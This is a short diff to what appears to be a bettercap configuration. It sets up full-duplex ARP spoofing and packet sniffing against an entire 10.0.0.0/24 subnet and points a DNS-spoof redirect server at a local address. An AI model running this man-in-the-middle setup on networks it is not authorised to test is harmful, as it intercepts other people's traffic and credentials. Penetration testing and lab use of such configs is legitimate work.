@@ -8,7 +8,7 @@ net.show
 set net.sniff true
 
 # ARP Spoofing Configuration
-set arp.spoof.targets 192.168.1.0/24
+set arp.spoof.targets 10.0.0.0/24
 set arp.spoof.whitelist ""
 set arp.spoof.fullduplex true
 
@@ -23,7 +23,7 @@ set arp.spoof.fullduplex true
 # set http.proxy.script ""
 
 # HTTP Server Configuration (for DNS spoof redirects)
-# set http.server.address 192.168.1.X
+# set http.server.address 10.0.0.243
 # set http.server.port 80
 
 # Enable logging
